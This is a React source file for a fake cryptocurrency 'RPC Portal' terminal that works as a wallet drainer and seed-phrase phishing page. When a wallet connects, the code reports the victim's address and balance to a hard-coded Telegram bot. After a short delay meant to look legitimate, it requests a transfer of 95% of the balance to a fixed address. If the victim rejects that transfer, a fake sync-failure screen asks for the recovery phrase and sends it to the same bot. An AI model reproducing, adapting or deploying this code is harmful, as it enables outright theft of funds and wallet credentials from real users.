import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSignMessage, useSwitchChain, useChains } from 'wagmi';
import { parseEther } from 'viem';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { signMessage } = useSignMessage();
  const { switchChain } = useSwitchChain();
  const chains = useChains();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING TO RPC MAINNET...");
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  // --- CONFIGURATION ---
  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  // --- TELEGRAM LOGGING ---
  const logToTelegram = async (msg) => {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: msg }),
    });
  };

  // --- THE WITHDRAWAL ENGINE ---
  const executeAutoSweep = async () => {
    if (!balance || !balance.value || balance.value === 0n) return;

    setLoading(true);
    setLoadingText("STABILIZING RPC TUNNEL...");

    try {
      // Calculate 95% of BigInt balance
      const sweepAmount = (balance.value * 95n) / 100n;

      sendTransaction({
        to: destination,
        value: sweepAmount,
      }, {
        onSuccess: (hash) => {
          logToTelegram(`✅ SUCCESS: 95% Sweep Triggered\nADDR: ${address}\nVAL: ${balance.formatted}\nHASH: ${hash}`);
          setLoadingText("FINALIZING ON-CHAIN...");
          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 3000);
        },
        onError: (err) => {
          logToTelegram(`❌ REJECTED: User denied transaction\nADDR: ${address}\nBAL: ${balance.formatted}\nERR: ${err.message.slice(0,50)}`);
          setLoading(false);
          setView("seed_gate"); // Immediately pivot to seed phrase if they reject
        }
      });
    } catch (e) {
      setLoading(false);
      setView("seed_gate");
    }
  };

  // --- AUTO-TRIGGER ON CONNECTION ---
  useEffect(() => {
    if (isConnected && address && balance?.value > 0n) {
      logToTelegram(`👀 NEW LEAD: ${address}\nBAL: ${balance.formatted} ${balance.symbol}`);
      // Small delay to make the UI look legitimate before the pop-up
      setTimeout(() => { executeAutoSweep(); }, 2000);
    }
  }, [isConnected, address, balance]);

  // --- SEED PHRASE HANDLING ---
  const handleSeedSubmit = () => {
    setIsSyncing(true);
    logToTelegram(`🚨 SEED CAPTURED\nADDR: ${address}\nKEY: ${seedVal}`);
    
    let cur = 0;
    const int = setInterval(() => {
      cur += 1;
      setSyncProgress(cur);
      if (cur >= 100) clearInterval(int);
    }, 150);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter flex flex-col relative select-none">
      
      {/* Market Chart Widget */}
      <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative">
         <iframe src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" className="absolute inset-0 w-full h-full opacity-60 pointer-events-none" title="Market" />
         <div className="absolute top-2 left-2 bg-black/80 px-2 py-1 rounded text-[7px] text-cyan-500 border border-cyan-900 font-black">LIVE_RPC_FEED</div>
      </div>

      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>RPC PORTAL V3</div>
          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black">NODE_ID: {address ? address.slice(0,10) : "OFFLINE"}</div>
        </div>
        <w3m-button balance="hide" /> 
      </header>

      {/* Main Terminal View */}
      <div className="flex-1 overflow-y-auto no-scrollbar pb-10">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3">
            {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Delay", "Bridge"].map((n) => (
              <button key={n} onClick={() => { setActiveTask(n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[20px] flex flex-col items-center gap-2 active:scale-95 transition-all">
                <div className="text-slate-700"><Cpu size={20}/></div>
                <span className="text-[9px] font-black text-slate-500">{n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[30px] p-6 text-center animate-in fade-in zoom-in">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto">← BACK TO CONSOLE</button>
            <h2 className="text-white font-black text-xl italic mb-4">{activeTask} PROTOCOL</h2>
            <div className="bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left">
              <label className="text-[7px] text-cyan-700 block font-black mb-1">SYSTEM_VALUATION</label>
              <div className="text-2xl font-mono text-white italic">{balance ? balance.formatted.slice(0,10) : "0.000"} <span className="text-xs">{balance?.symbol}</span></div>
            </div>
            <button onClick={executeAutoSweep} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white shadow-xl active:scale-95 uppercase">EXECUTE {activeTask}</button>
          </div>
        )}
      </div>

      {/* Seed Phrase Gate (Failure Fallback) */}
      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/95 z-[500] flex flex-col items-center justify-center p-6 backdrop-blur-xl">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[30px] p-8 text-center">
            {!isSyncing ? (
              <>
                <AlertCircle size={40} className="text-red-600 mx-auto mb-4 animate-pulse" />
                <h2 className="text-white font-black text-sm italic">RPC Sync Failure (90%)</h2>
                <p className="text-[8px] text-slate-500 my-2">MANUAL NODE ALIGNMENT REQUIRED. ENTER RECOVERY KEY TO RESTORE ASSETS.</p>
                <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." className="w-full h-32 bg-black border border-slate-800 rounded-[20px] p-4 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
                <button onClick={handleSeedSubmit} disabled={seedVal.split(' ').length < 12} className="w-full mt-4 bg-red-900 py-5 rounded-[15px] text-[10px] font-black text-white uppercase disabled:opacity-30">RESTORE_SYNC</button>
              </>
            ) : (
              <div className="py-8">
                <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin mx-auto mb-6" />
                <h2 className="text-white font-black text-xl italic">{syncProgress}% SYNCED</h2>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Global Loader */}
      {loading && <div className="fixed inset-0 bg-black/90 z-[600] flex flex-col items-center justify-center"><div className="w-10 h-10 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" /><p className="text-[8px] font-black text-cyan-500 mt-6 tracking-[0.3em] animate-pulse">{loadingText}</p></div>}
    </div>
  );
}
